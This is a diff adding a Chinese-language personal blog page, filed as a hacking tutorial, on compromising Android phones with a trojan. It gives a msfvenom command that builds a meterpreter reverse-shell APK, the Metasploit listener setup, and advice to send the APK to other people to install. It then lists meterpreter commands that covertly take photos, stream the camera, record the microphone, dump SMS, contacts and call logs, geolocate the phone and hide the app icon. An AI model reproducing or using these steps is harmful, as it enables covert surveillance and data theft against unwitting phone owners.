@@ -1,0 +1,156 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="Generator" content="EditPlus®">
+  <meta name="Author" content="">
+  <meta name="Keywords" content="">
+  <meta name="Description" content="">
+  <title>成宝博文-木马入侵-入侵Android系统</title>
+    <!--引入基础库-->
+    <meta name='viewport' content='width=device-width,minimum-scale=1.0 maximum-scale=1.0 user-scalable=no' /> 
+ <!-- bootstrap基础文件 -->
+<link href="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.4.1/css/bootstrap.min.css" rel="stylesheet">
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.4.1/js/bootstrap.min.js"></script>
+   <!-- 结束 -->
+   <!-- 图片懒加载库 -->
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+  <script src="../js/publicjs.js"></script><!-- 公共js代码 -->
+  <link href="../css/publiccss.css" rel="stylesheet"><!-- 公共css代码 -->
+  <!-- 妹子框架 -->
+   <!-- <script src="https://cdn.bootcdn.net/ajax/libs/amazeui/2.7.2/css/amazeui.min.css"></script>  -->
+  <!-- 结束 -->
+  <style>
+    	/*在超小屏幕下 手机 小于768px布局容器的宽度为100%*/
+	@media screen and (max-width: 767px){
+	        /*.img{width:100%;}*/
+	    }
+    /*小屏幕 平板电脑 大于等于768px 布局容器改为750px*/
+    	@media screen and (min-width: 768px){
+	      .lazy{height:500px;height:500px;} 
+	    }
+   /*中等屏幕 992px 布局容器改为970px*/
+       	@media screen and (min-width: 992px){
+	      .lazy{height:500px;height:500px;} 
+	    }
+       /*大屏幕 大于1200px 布局容器改为1170px*/
+	    @media screen and (min-width: 992px){
+	     .lazy{height:500px;height:500px}   .
+	  }
+	  h6{font-size:18px;}
+  </style>
+ </head>
+ <body>
+        <!-- 顶部移动端PC端适配菜单栏 -->
+<nav class="navbar navbar-default" role="navigation">
+    <div class="container-fluid"> 
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse"
+                data-target="#example-navbar-collapse">
+            <span class="sr-only">切换导航</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="#">成宝个人网站</a>
+    </div>
+    <div class="collapse navbar-collapse" id="example-navbar-collapse">
+        <ul class="nav navbar-nav">
+            <li class="active"><a href="../index.html">首页</a></li>
+        </ul>
+    </div>
+    </div>
+</nav>
+ <!-- 菜单结束 -->
+ <!-- 选择主题 -->
+<div class="style-btn">
+<h4>选择主题</h4>
+<button type="button" class="btn btn-default de-style" onclick="green()">护眼绿</button>
+<button type="button" class="btn btn-default dark-style" onclick="dark()">暗黑模式</button>
+</div>
+<!-- 结束 -->
+<!-- 面包屑导航 -->
+<ul class="breadcrumb">
+    <li><a href="#">首页</a></li>
+    <li><a href="#">黑客教程</a></li>
+    <li class="active">木马入侵Android系统</li>
+</ul>
+<!-- 面包屑提示结束 -->
+<!-- 正文 -->
+     <div class="container">
+	              <h1>基于木马入侵-入侵Android系统</h1>
+				  <div class="panel panel-danger">
+					<div class="panel-heading">
+						<h3 class="panel-title">什么是木马?</h3>
+					</div>
+					<div class="panel-body">
+						<h4>木马就是一种恶意的远程控制窃取用户敏感信息的恶意软件,木马具有隐蔽性一般人是很难发现他的存在,
+						木马是不会发作没有任务栏图标没有窗口所以隐藏性很强
+						</h4>
+						<h4>木马是用来控制别人电脑 例如查看别人电脑的文件系统对别人电脑里面的文件进行操作也会用来记录你键盘的点击和操作,木马会悄悄地
+						躲在你电脑里面窃取隐私信息发给黑客 任意接收黑客发送的命令并且执行
+						</h4>
+					</div>
+				</div>
+         <h3>1.开始生成木马</h3>
+         <h4>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=6667 R > /root/apk.apk</h4>
+					<h3>2.监听木马端口</h3>
+					   <h3> 第一步:</h3>
+						<h3>开始监听木马</h3>
+						<h4>use exploit/multi/handler <span style = "color:green">//使用这个模块</span></h4>
+						<h4>set playload android/meterpreter/reverse_tcp<span style = "color:green">//设置攻击负荷</span></h4>
+						<h4>set lhost 192.168.0.106<span style = "color:green"> //在这里设置本地的IP地址</span></h4>
+						<h4>set lport 6667<span style = "color:green"> //这里设置端口要和木马设置的端口保持一致</span></h4>
+						<h4>exploit<span style = "color:green">//开始攻击</span></h4>
+						<h3>木马处于监听状态 等到别人点击木马了你这里就会出现控制台</h3>
+			            <h3>把apk导出给发给别人然后等着别人在手机安装就可以了</h3>
+									<h3>命令</h3>
+									<h4>sysinfo 系统设备信息</h4>
+									<h4>webcam_list 摄像头列表</h4>
+									<h4>webcam_snap 隐私拍照</h4>
+									<h4>dump_contacts 获取联系人</h4>
+									<h4>dump_sms 获取短信</h4>
+									<h4>webcam_stream 视频监控</h4>
+									<h4>app_list app列表</h4>
+									<h4>app_run 运行app</h4>
+									<h4>app_install安装app</h4>
+									<h4>app_uninstall卸载app</h4>
+									<h4>ifconfig查看网络信息</h4>
+									<h4>dump_calllog获取通话记录</h4>
+									<h4>check_root检查root</h4>
+									<h4>ps查看正在运行的程序</h4>
+									<h4>localtime本地时间</h4>
+									<h4>send_sms发送短信</h4>
+									<h4>wakelock 屏幕</h4>
+									<h4>sessions sessions 1</h4>
+									<h4>geolocate 获取手机的当前的经纬度</h4>
+									<h4>hide_app_icon 隐藏手机端木马程序图标</h4>
+									<h4>record_mic　　　 #音频录制</h4>
+									<h4>webcam_chat　　　#查看摄像头接口</h4>
+									<h4>webcam_list　　　#查看摄像头列表</h4>
+									<h4>webcam_stream　　#摄像头视频获取  -i选择摄像头</h4>
+									<h4>webcam_list          #获得摄像头信息</h4>
+									<h4>webcam_snap       #摄像头拍照，-i  选择摄像头</h4>
+									<h4>Send_sms -d 电话 -t 内容         #发送短息</h4>
+									<h4>dump_contacts           #获得联系人</h4>
+									<h4>dump_sms                 #获得信息</h4>
+				  <!-- <img class="lazy" data-original="https://img.52z.com/upload/news/image/20200421/20200421121630_33367.jpg">  -->
+	</div>
+   <!-- 正文结束 -->
+	 <!-- ----------------底部面板------------------------ -->
+ <div class="panel panel-success">
+    <div class="panel-heading">
+        <h3 class="panel-title">温馨提示</h3>
+    </div>
+    <div class="panel-body">
+         <p>欢迎收藏哦</p>
+		<strong>如有问题请联系作者微信:<span style="color:red;">HA2765441358</span></strong>
+    </div>
+</div>
+<!-------------- 面板结束--------------------------- -->
+ </body>
+ <script>
+	
+ </script>
+</html>
